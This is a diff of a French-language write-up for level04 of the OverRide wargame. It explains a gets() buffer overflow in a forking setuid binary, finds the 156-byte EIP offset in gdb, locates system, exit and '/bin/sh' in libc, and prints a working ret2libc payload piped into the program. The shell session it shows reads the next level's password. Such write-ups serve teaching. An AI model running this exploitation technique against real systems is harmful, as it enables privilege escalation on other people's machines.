@@ -1,23 +1,17 @@
 ### Level04
 
-Pour commencer on peut examiner le binaire en faisant:
-```
-level04@OverRide:~$ file level04
-level04: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x7386c3c1bbd3e4d8fc85f88744379783bf327fd7, not stripped
-```
+Pour commencer on peut examiner le binaire en faisant :
+	
+	level04@OverRide:~$ file level04
+	level04: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x7386c3c1bbd3e4d8fc85f88744379783bf327fd7, not stripped
+	
 
 On voit que le binaire est en ELF 32-bit.
-
 En examinant le code (voir source), on peut voir que le programme cree un processus fils en faisant appel la fonction fork().
-
 Dans le processus fils il y a un appel a la fonction gets() qui est fait afin de recuperer ce qui est taper sur l'entree standard pour le stocker dans un buffer de 32 octets declarer au debut du main.
-
 Le processus pere quand a lui se trouve dans une boucle infinie (while (1)) et attend la fin du processus fils via la fonction wait pour continuer le programme.
-
 Si le le processus enfant se termine normalement le process pere va afficher via puts(): "child is exiting..." et faire un break pour quitter le programme.
-
 Si le processus fils n'a pas quitter normalement alors le process pere va faire appel a la fonction ptrace pour recuperer l'adresse contenue dans le registre eip du procesus fils.
-
 Apres il y a une condition qui regarde si le syscall dans eip est egal a 11.
 11 correspond a l'appel systeme execve sur un processeur 32-bit.
 
@@ -26,103 +20,100 @@ Donc on sait que pour reussir notre exploit il ne va pas falloir utiliser execve
 Maintenant en testant le programme on voit qu'en mettant une chaine de 200 en input le processus fils ne quitte pas et semble bloquer.
 
 Afin d'avoir plus de precisions dans gdb on peut faire:
-```
-set follow-fork-mode child
-```
+	
+	set follow-fork-mode child
+	
 Ce qui nous permet de suivre desormais le processus fils dans gdb.
 Maintenant pour calculer l'offset on utilise un generateur de buffer overflow.
 On voit qu'on ecrase bien eip en faisant info registers.
-```
-(gdb) set follow-fork-mode child
-(gdb) r
-Starting program: /home/users/level04/level04 
-[New process 1827]
-Give me some shellcode, k
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+	
+	(gdb) set follow-fork-mode child
+	(gdb) r
+	Starting program: /home/users/level04/level04 
+	[New process 1827]
+	Give me some shellcode, k
+	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
-Program received signal SIGSEGV, Segmentation fault.
-[Switching to process 1827]
-0x41326641 in ?? ()
-(gdb) info registers
-eax            0x0	0
-ecx            0xf7fd08c4	-134412092
-edx            0xffffd670	-10640
-ebx            0x41386541	1094214977
-esp            0xffffd710	0xffffd710
-ebp            0x31664130	0x31664130
-esi            0x0	0
-edi            0x66413965	1715550565
-eip            0x41326641	0x41326641
-eflags         0x10282	[ SF IF RF ]
-cs             0x23	35
-ss             0x2b	43
-ds             0x2b	43
-es             0x2b	43
-fs             0x0	0
-gs             0x63	99
-```
+	Program received signal SIGSEGV, Segmentation fault.
+	[Switching to process 1827]
+	0x41326641 in ?? ()
+	(gdb) info registers
+	eax            0x0	0
+	ecx            0xf7fd08c4	-134412092
+	edx            0xffffd670	-10640
+	ebx            0x41386541	1094214977
+	esp            0xffffd710	0xffffd710
+	ebp            0x31664130	0x31664130
+	esi            0x0	0
+	edi            0x66413965	1715550565
+	eip            0x41326641	0x41326641
+	eflags         0x10282	[ SF IF RF ]
+	cs             0x23	35
+	ss             0x2b	43
+	ds             0x2b	43
+	es             0x2b	43
+	fs             0x0	0
+	gs             0x63	99
+	
 
 L'offset est donc de 156 pour ecraser EIP.
 
 Pour exploiter le gets on peut faire un ret2libc. Il suffit juste de ne pas utiliser la fonction execve. DOnc un simple system(/bin/sh) devrait faire l'affaire.
 
 Pour recuper l'adresse des fonctions system() et exit() un simple print system et print exit suffiront:
-```
-(gdb) p system
-$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
-(gdb) p exit
-$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
-```
+	
+	(gdb) p system
+	$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+	(gdb) p exit
+	$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+	
 
 Pour recuperer l'adresse de l'argument '/bin/sh' on doit faire:
-```
-(gdb) info proc map
-process 1827
-Mapped address spaces:
 
-	Start Addr   End Addr       Size     Offset objfile
-	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
-	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
-	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
-	0xf7e2b000 0xf7e2c000     0x1000        0x0 
-	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
-	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
-	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
-	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
-	0xf7fd0000 0xf7fd4000     0x4000        0x0 
-	0xf7fd8000 0xf7fda000     0x2000        0x0 
-	0xf7fda000 0xf7fdb000     0x1000        0x0 
-	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
-	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
-	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
-	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
-	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
-(gdb) find 0xf7e2c000, 0xf7fcc000,"/bin/sh"
-0xf7f897ec
-1 pattern found.
-(gdb) 
-```
+	(gdb) info proc map
+	process 1827
+	Mapped address spaces:
+
+		Start Addr   End Addr       Size     Offset objfile
+		0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
+		0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
+		0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
+		0xf7e2b000 0xf7e2c000     0x1000        0x0 
+		0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+		0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+		0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+		0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+		0xf7fd0000 0xf7fd4000     0x4000        0x0 
+		0xf7fd8000 0xf7fda000     0x2000        0x0 
+		0xf7fda000 0xf7fdb000     0x1000        0x0 
+		0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+		0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+		0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+		0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+		0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+	(gdb) find 0xf7e2c000, 0xf7fcc000,"/bin/sh"
+	0xf7f897ec
+	1 pattern found.
+
 Cela nous permet d'aller chercher directement l'adresse de /bin/sh dans les bibliotheques partagees de la libc.
-
 On peut maintenant construire notre payload:
-```
-payload = python -c 'print "A" \* 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'
-```
+	
+	python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'
+	
 
 Plus qu'a executer notre payload en faisant:
-```
-(python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
-```
-
+	
+	(python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
+	
 Voila le resultat:
-```
-level04@OverRide:~$ (python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
-Give me some shellcode, k
-ls
-ls: cannot open directory .: Permission denied
-cd ../level05
-cat .pass
-3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
-```
+
+	level04@OverRide:~$ (python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
+	Give me some shellcode, k
+	ls
+	ls: cannot open directory .: Permission denied
+	cd ../level05
+	cat .pass
+	3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
 
 SUCCESS!!!
